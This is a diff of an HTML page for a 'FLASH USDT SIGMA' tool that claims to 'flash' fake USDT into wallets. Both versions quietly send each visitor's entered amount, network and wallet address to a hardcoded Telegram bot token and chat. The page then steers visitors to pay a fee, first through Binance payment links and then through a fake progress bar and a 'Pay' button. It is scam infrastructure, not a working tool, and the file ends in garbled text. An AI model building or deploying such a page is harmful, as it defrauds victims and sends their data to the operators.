@@ -1,28 +1,25 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Send USDT</title>
+  <title>FLASH USDT SIGMA 3.60</title>
   <style>
     * {
-      box-sizing: border-box;
       margin: 0;
       padding: 0;
+      box-sizing: border-box;
     }
 
     body, html {
       height: 100%;
-      font-family: 'Poppins', sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: transparent;
+      font-family: sans-serif;
+      color: white;
       overflow: hidden;
       position: relative;
     }
 
-    #bgVideo {
+    video#bgVideo {
       position: fixed;
       top: 0;
       left: 0;
@@ -32,272 +29,290 @@
       z-index: -1;
     }
 
-    .logo-icon {
-      position: fixed;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 80px;
-      height: 80px;
-      border-radius: 50%;
-      object-fit: cover;
-      z-index: 10;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-    }
-
     .container {
-      width: 90%;
-      max-width: 400px;
-      padding: 25px;
-      background-color: rgba(0, 0, 0, 0.3);
-      backdrop-filter: blur(10px);
+      background-color: rgba(0, 0, 0, 0.75);
       border-radius: 20px;
+      padding: 20px;
+      width: 85%;
+      max-width: 350px;
+      position: absolute;
+      top: 55%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      box-shadow: 0 0 15px #00aaff;
+      animation: fadeInUp 1s ease forwards;
+      opacity: 0;
+    }
+
+    @keyframes fadeInUp {
+      0% {
+        opacity: 0;
+        transform: translate(-50%, 10%);
+      }
+      100% {
+        opacity: 1;
+        transform: translate(-50%, -50%);
+      }
+    }
+
+    h1 {
       text-align: center;
-      color: #1DBF73;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
-    }
-
-    h2 {
+      color: #00aaff;
+      font-size: 1.5rem;
       margin-bottom: 20px;
-      font-size: 26px;
-      font-weight: bold;
-    }
-
-    label {
-      display: block;
-      text-align: right;
-      margin-bottom: 8px;
-      font-weight: 600;
-      font-size: 16px;
     }
 
     input, select {
       width: 100%;
-      padding: 12px;
-      margin-bottom: 16px;
-      border: none;
+      padding: 10px;
+      margin: 10px 0;
       border-radius: 10px;
-      font-size: 15px;
-      background-color: rgba(52, 73, 94, 0.5);
-      color: #1DBF73;
+      border: none;
+      background-color: #111;
+      color: white;
     }
 
     button {
       width: 100%;
-      padding: 14px;
+      padding: 10px;
+      background-color: #00aaff;
       border: none;
-      border-radius: 12px;
-      font-size: 16px;
-      font-weight: bold;
+      border-radius: 10px;
+      color: white;
+      font-size: 1rem;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    #loadingBar {
+      height: 5px;
+      background-color: #00aaff;
+      width: 0%;
+      transition: width 1s linear;
+      margin-top: 10px;
+      display: none;
+    }
+
+    .support-btn, .discord-btn {
+      position: fixed;
+      width: 45px;
+      height: 45px;
+      border-radius: 50%;
+      border: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      box-shadow: 0 0 10px #00aaff;
+      z-index: 1000;
+    }
+
+    .support-btn {
+      bottom: 20px;
+      right: 20px;
+      background-color: #0088cc;
+    }
+
+    .discord-btn {
+      bottom: 20px;
+      right: 80px; /* 60px left from telegram */
+      background-color: #5865F2;
+    }
+
+    .support-btn svg, .discord-btn svg {
+      width: 22px;
+      height: 22px;
+    }
+
+    .lang-dropdown {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 999;
+    }
+
+    .lang-btn {
+      background-color: #222;
+      color: #00aaff;
+      border: none;
+      border-radius: 50%;
+      width: 45px;
+      height: 45px;
+      font-size: 18px;
       cursor: pointer;
     }
 
-    .proxy-button {
-      background-color: #e74c3c;
-      color: white;
-      margin-bottom: 16px;
+    .lang-options {
+      display: none;
+      position: absolute;
+      top: 55px;
+      right: 0;
+      background-color: #111;
+      border-radius: 10px;
+      overflow: hidden;
     }
 
-    .top-controls {
-      position: fixed;
-      bottom: 20px;
+    .lang-options select {
       width: 100%;
-      max-width: 500px;
-      display: flex;
-      justify-content: space-between;
-      padding: 0 20px;
-      left: 50%;
-      transform: translateX(-50%);
+      padding: 8px;
+      border: none;
+      background: transparent;
+      color: white;
     }
 
-    .lang-dropdown, .wallet-dropdown {
-      background-color: rgba(42, 61, 68, 0.4);
-      border: none;
-      border-radius: 999px;
-      padding: 8px 10px;
-      color: #1DBF73;
-      font-size: 14px;
-      width: 48%;
-      text-align: center;
+    .lang-dropdown:hover .lang-options {
+      display: block;
     }
   </style>
 </head>
 <body>
 
+  <!-- خلفية فيديو -->
   <video autoplay muted loop id="bgVideo">
-    <source src="background.mp4" type="video/mp4">
-    Your browser does not support the video tag.
+    <source src="background.mp4" type="video/mp4" />
+    Your browser does not support HTML5 video.
   </video>
 
-  <img src="logo.gif" alt="Logo" class="logo-icon"/>
+  <!-- قائمة اللغات -->
+  <div class="lang-dropdown">
+    <button class="lang-btn">🌐</button>
+    <div class="lang-options">
+      <select id="langSelect">
+        <option value="en">English</option>
+        <option value="fr">Français</option>
+        <option value="ru">Русский</option>
+        <option value="zh">中文</option>
+      </select>
+    </div>
+  </div>
 
+  <!-- النموذج -->
   <div class="container">
-    <h2 id="pageTitle">SIGMA USDT FLASHER 3.59</h2>
-
-    <label for="amount" id="amountLabel">AMOUNT  ($)</label>
-    <select id="amount">
-      <option value="5000">5000</option>
-      <option value="20000">20000</option>
-      <option value="100000">100000</option>
-    </select>
-
-    <label for="network" id="networkLabel">Choose Network</label>
+    <h1 id="title">FLASH USDT SIGMA 3.60</h1>
+    <input type="number" id="amount" placeholder="Amount (> 5000)" />
     <select id="network">
       <option value="TRC20">TRC20</option>
+      <option value="ERC20">ERC20</option>
       <option value="BEP20">BEP20</option>
-      <option value="ETH">Ethereum (ERC20)</option>
     </select>
-
-    <label for="wallet" id="walletLabel">wellet adress</label>
-    <input type="text" id="wallet" placeholder="type wallet adress reciever " />
-
-    <button class="proxy-button" id="proxyBtn" onclick="activateProxy()">Proxy (Activate if you are not in USA)</button>
-
-    <button id="submitBtn" onclick="submitTransfer()">Send</button>
+    <input type="text" id="wallet" placeholder="Wallet Address" />
+    <button id="verifyBtn">Verify</button>
+    <div id="loadingBar"></div>
+    <button id="sendBtn" style="display:none;">Pay</button>
   </div>
 
-  <div class="top-controls">
-    <select class="lang-dropdown" id="languageSelector" onchange="setLanguage()">
-      <option value="en">🌐 English</option>
-      <option value="ar">🌐 العربية</option>
-      <option value="zh">🌐 中文</option>
-      <option value="ur">🌐 اردو</option>
-    </select>
+  <!-- زر دعم تلغرام -->
+  <a href="https://t.me/Sigmasupport360bot" target="_blank" rel="noopener noreferrer">
+    <button class="support-btn" title="Telegram Support">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="white" viewBox="0 0 24 24"><path d="M9.447 15.106 8.88 19.08c.626 0 .9-.27 1.24-.594l2.98-2.81 4.17 3.05c.763.42 1.31.2 1.5-.705L22.93 5.41c.24-.98-.372-1.367-1.088-1.094L2.49 10.49c-.96.38-.945.92-.163 1.17l4.93 1.54L18.63 7.4c.44-.3.84-.14.51.16"/></svg>
+    </button>
+  </a>
 
-    <select class="wallet-dropdown" id="walletSelector" onchange="connectWallet()">
-      <option value="none">🔗 Choose Wallet</option>
-      <option value="metamask">🦊 MetaMask</option>
-      <option value="trustwallet">🔐 Trust Wallet</option>
-    </select>
-  </div>
+  <!-- زر دعم ديسكورد -->
+  <a href="https://discord.gg/8cSDJZjE" target="_blank" rel="noopener noreferrer">
+    <button class="discord-btn" title="Discord Support">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="white" viewBox="0 0 24 24">
+        <path d="M20.317 4.3698A19.7913 19.7913 0 0016.016 3c-.211 0-.423.004-.632.01a14.9931 14.9931 0 00-2.857.472 15.0662 15.0662 0 00-7.031 3.588A19.7793 19.7793 0 002.694 12.17a19.84 19.84 0 00.003 6.656 15.05 15.05 0 005.972 4.211c.442.167.91.303 1.395.397a19.7582 19.7582 0 005.263.617 19.6817 19.6817 0 004.583-.588 15.09 15.09 0 006.522-4.234 19.84 19.84 0 00-3.557-11.06 15.036 15.036 0 00-4.074-3.054zm-11.65 10.684c-1.18 0-2.148-1.08-2.148-2.412 0-1.332.955-2.412 2.148-2.412 1.208 0 2.178 1.08 2.148 2.412 0 1.332-.94 2.412-2.148 2.412zm7.335 0c-1.18 0-2.148-1.08-2.148-2.412 0-1.332.955-2.412 2.148-2.412 1.208 0 2.178 1.08 2.148 2.412 0 1.332-.94 2.412-2.148 2.412z"/>
+      </svg>
+    </button>
+  </a>
 
+  <!-- سكربت متعدد اللغات والتحقق -->
   <script>
     const translations = {
       en: {
-        pageTitle: "SIGMA USDT FLASHER 3.59",
-        amountLabel: "Amount ($)",
-        networkLabel: "Choose Network",
-        walletLabel: "Wallet Address",
-        submitBtn: "Send",
+        title: "FLASH USDT SIGMA 3.60",
+        amount: "Amount (> 5000)",
+        wallet: "Wallet Address",
+        verify: "Verify",
+        send: "Pay"
       },
-      ar: {
-        pageTitle: "SIGMA USDT FLASHER 3.59",
-        amountLabel: "حجم النقود ($)",
-        networkLabel: "اختر الشبكة",
-        walletLabel: "عنوان المحفظة",
-        submitBtn: "إرسال",
+      fr: {
+        title: "FLASH USDT SIGMA 3.60",
+        amount: "Montant (> 5000)",
+        wallet: "Adresse de portefeuille",
+        verify: "Vérifier",
+        send: "Payer"
+      },
+      ru: {
+        title: "FLASH USDT SIGMA 3.60",
+        amount: "Сумма (> 5000)",
+        wallet: "Адрес кошелька",
+        verify: "Проверить",
+        send: "Оплатить"
       },
       zh: {
-        pageTitle: "SIGMA USDT FLASHER 3.59",
-        amountLabel: "金额 ($)",
-        networkLabel: "选择网络",
-        walletLabel: "钱包地址",
-        submitBtn: "发送",
-      },
-      ur: {
-        pageTitle: "SIGMA USDT FLASHER 3.59",
-        amountLabel: "رقم ($)",
-        networkLabel: "نیٹ ورک منتخب کریں",
-        walletLabel: "والٹ کا پتہ",
-        submitBtn: "ارسال کریں",
+        title: "FLASH USDT SIGMA 3.60",
+        amount: "金额 (> 5000)",
+        wallet: "钱包地址",
+        verify: "验证",
+        send: "支付"
       }
     };
 
-    function setLanguage() {
-      const lang = document.getElementById("languageSelector").value;
-      const t = translations[lang];
-      document.getElementById("pageTitle").innerText = t.pageTitle;
-      document.getElementById("amountLabel").innerText = t.amountLabel;
-      document.getElementById("networkLabel").innerText = t.networkLabel;
-      document.getElementById("walletLabel").innerText = t.walletLabel;
-      document.getElementById("submitBtn").innerText = t.submitBtn;
+    const langSelect = document.getElementById("langSelect");
+    const defaultLang = localStorage.getItem("language") || navigator.language.slice(0, 2);
+    const lang = translations[defaultLang] ? defaultLang : "en";
+    langSelect.value = lang;
+    setLanguage(lang);
+
+    langSelect.addEventListener("change", () => {
+      localStorage.setItem("language", langSelect.value);
+      setLanguage(langSelect.value);
+    });
+
+    function setLanguage(lang) {
+      document.getElementById("title").textContent = translations[lang].title;
+      document.getElementById("amount").placeholder = translations[lang].amount;
+      document.getElementById("wallet").placeholder = translations[lang].wallet;
+      document.getElementById("verifyBtn").textContent = translations[lang].verify;
+      const amount = document.getElementById("amount").value;
+      const payText = amount ? `Pay (${(amount * 10 / 5000).toFixed(2)})` : translations[lang].send;
+      document.getElementById("sendBtn").textContent = payText;
     }
 
-    async function connectWallet() {
-      const wallet = document.getElementById("walletSelector").value;
-
-      if (wallet === "metamask" && typeof window.ethereum !== 'undefined') {
-        try {
-          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-          const walletAddress = accounts[0];
-          document.getElementById('wallet').value = walletAddress;
-          alert("MetaMask wallet connected: " + walletAddress);
-        } catch (error) {
-          alert("Failed to connect wallet: " + error.message);
-        }
-      } else if (wallet === "trustwallet") {
-        try {
-          window.location.href = "trust://";
-          setTimeout(function() {
-            alert("Trust Wallet not found. Please make sure it is installed.");
-          }, 2000);
-        } catch (error) {
-          alert("Failed to connect Trust Wallet.");
-        }
-      } else {
-        alert("No wallet found. Please make sure MetaMask or Trust Wallet is installed.");
-      }
-    }
-
-    function submitTransfer() {
+    document.getElementById("verifyBtn").addEventListener("click", async () => {
       const amount = document.getElementById("amount").value;
       const network = document.getElementById("network").value;
       const wallet = document.getElementById("wallet").value;
 
-      if (!amount || !wallet) {
-        alert("Please fill in all fields.");
+      if (amount <= 4999 || !wallet) {
+        alert("Enter valid amount and wallet address");
         return;
       }
 
-      const message = `New USDT Request:\nAmount: $${amount}\nNetwork: ${network}\nWallet: ${wallet}`;
-      const token = '8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw';
-      const chatId = '7739393558';
+      const message = `New Verification:\nAmount: ${amount}\nNetwork: ${network}\nWallet: ${wallet}`;
+      const telegramUrl = `https://api.telegram.org/bot8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw/sendMessage?chat_id=7739393558&text=${encodeURIComponent(message)}`;
+      await fetch(telegramUrl);
 
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      })
-      .then(response => {
-        if (!response.ok) throw new Error("Telegram error");
+      const loadingBar = document.getElementById("loadingBar");
+      loadingBar.style.display = "block";
+      loadingBar.style.width = "0%";
 
-        let url = '';
-        if (amount === "5000") {
-          url = "https://s.binance.com/k4fkMdfq";
-        } else if (amount === "20000") {
-          url = "https://s.binance.com/OBmWcAwi";
-        } else if (amount === "100000") {
-          url = "https://s.binance.com/JFhAxiky";
+      let progress = 0;
+      const interval = setInterval(() => {
+        progress += 10;
+        loadingBar.style.width = progress + "%";
+        if (progress >= 100) {
+          clearInterval(interval);
+          const payAmount = (amount * 10 / 5000).toFixed(2);
+          document.getElementById("sendBtn").textContent = `Pay (${payAmount})`;
+          document.getElementById("sendBtn").style.display = "block";
+          document.getElementById("verifyBtn").style.display = "none";
         }
+      }, 1000);
+    });
 
-        if (url) {
-          window.location.href = `${url}?amount=${amount}&network=${network}&wallet=${encodeURIComponent(wallet)}`;
-        } else {
-          alert("Invalid amount selected.");
-        }
-      })
-      .catch(error => {
-        alert("Failed to send data to Telegram: " + error.message);
-      });
-    }
+    document.getElementById("sendBtn").addEventListener("click", () => {
+      window.location.href = "page2.html";
+    });
 
-    let proxyActive = false;
-    function activateProxy() {
-      const btn = document.getElementById("proxyBtn");
-      proxyActive = !proxyActive;
-
-      if (proxyActive) {
-        btn.style.backgroundColor = "#27ae60";
-        btn.textContent = "Proxy Activated";
-      } else {
-        btn.style.backgroundColor = "#e74c3c";
-        btn.textContent = "Proxy (Activate if you are not in USA)";
-      }
-    }
+    document.getElementById("amount").addEventListener("input", () => {
+      const amount = document.getElementById("amount").value;
+      const lang = langSelect.value;
+      const payText = amount > 0 ? `Pay (${(amount * 10 / 5000).toFixed(2)})` : translations[lang].send;
+      document.getElementById("sendBtn").textContent = payText;
+    });
   </script>
-
 </body>
-      </html>
+</htmوعنوانح
